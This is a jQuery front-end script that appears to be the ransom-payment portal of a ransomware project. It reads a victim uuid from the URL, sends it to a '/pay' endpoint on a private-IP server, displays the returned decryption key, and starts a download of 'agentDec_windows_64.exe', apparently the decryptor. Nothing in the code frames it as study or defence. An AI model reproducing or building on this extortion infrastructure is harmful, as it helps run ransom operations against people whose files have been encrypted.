$(document).ready(function(){
    
    var uuid = getParameterByName("uuid");
    console.log(uuid)

    $("#uuid").text(uuid)
     // The .click functions get called after their respective .on functions
    $("#pay").click(function(e) {
        var jsonToSend = {
            "uuid" : uuid
        };
        makeAjaxCall("http://192.168.24.231/pay", jsonToSend, function(data){
            console.log(data)
            $("#keySection").attr("class","visible")
            var key = JSON.parse(data)
            $("#key").text(key.Key)
            e.preventDefault();  //stop the browser from following
            window.location.href = 'agentDec_windows_64.exe';
        })
    })
})

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

// This is the default AJAX call for anything
function makeAjaxCall(url, params, callback){
        $.ajax({
           url: url,
           type: "GET",
           data: params,
           success : function(dataReceived){
            callback(dataReceived);
           },
           error : function (dataError){
            callback(dataError);
           }
    });
}




